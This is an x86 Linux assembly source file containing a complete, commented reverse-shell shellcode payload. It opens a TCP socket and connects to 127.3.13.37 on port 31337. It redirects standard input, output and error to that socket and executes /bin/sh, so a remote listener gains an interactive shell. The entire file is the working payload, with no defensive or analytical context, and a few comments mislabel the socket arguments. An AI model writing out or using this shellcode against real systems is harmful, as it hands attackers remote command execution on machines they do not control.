global _start

section .text

_start:

socket:
        xor eax, eax    ; Zeroing out eax
        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax

        xor ebx, ebx    ; Zeroing out ebx
        mov bl, 0x01    ; Setting the first argument (SYS_SOCKET)
        xor ecx, ecx    ; Zeroing out ecx

        push 0x06	; Setting Domain = TCP
        push 0x01	; Setting Type = SOCK_STREAM
        push 0x02 	; Setting Protocol = AF_INET

        mov ecx, esp    ; ECX points to the arguments
        int 0x80

        xor edi, edi    ; Zeroing out edi
        xchg eax, edi   ; Exchanging the values between eax and edi to assign sockfd to edi

connect:
	push 0x250d037f	; Pushing internet address value (127.3.13.37) in hex 
	push word 0x697a; Pushing port number value (31337) in hex

	push word 0x02	; Pushing address family value (AF_INET)

	mov ecx, esp

	push byte 0x10	; Pushing addrlen value
	push ecx	; Pushing the structure addr*
	push edi	; Pushing sockfd to the stack

	mov ecx, esp	; ECX points to the arguments

	mov bl, 0x03	; Setting the first argument to SYS_CONNECT
        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax
        int 0x80

dup2:
        mov ebx, edi    ; Setting sockfd 
        xor eax, eax    ; Zeroing out eax
        xor ecx, ecx    ; Zeroing out ecx
        mov cl, 0x02    ; Setting cl to 2 (stdin)

lp:
        mov al, 0x3f    ; Setting the syscall (SYS_DUP2) number to eax
        int 0x80        ;
        dec ecx         ; Decrease ecx by one, to set stdout and stderr
        jns lp          ; Jump if not sign (positive value) - loop


execve:
        xor eax, eax    ; Zeroing out eax
        push eax        ; Pushing NULL to terminate "/bin//sh"
        push 0x68732f2f ; "hs//"
        push 0x6e69622f ; "nib/"
        mov ebx, esp    ; EBX points to "/bin//sh"


        push eax        ; Pushing NULL to the stack
        mov edx, esp    ; Setting envp argument

        push ebx        ; Pushing the address
        mov ecx, esp    ; Setting argv argument

        mov al, 0x0B    ; Setting the syscall (SYS_EXECVE) number to eax
        int 0x80
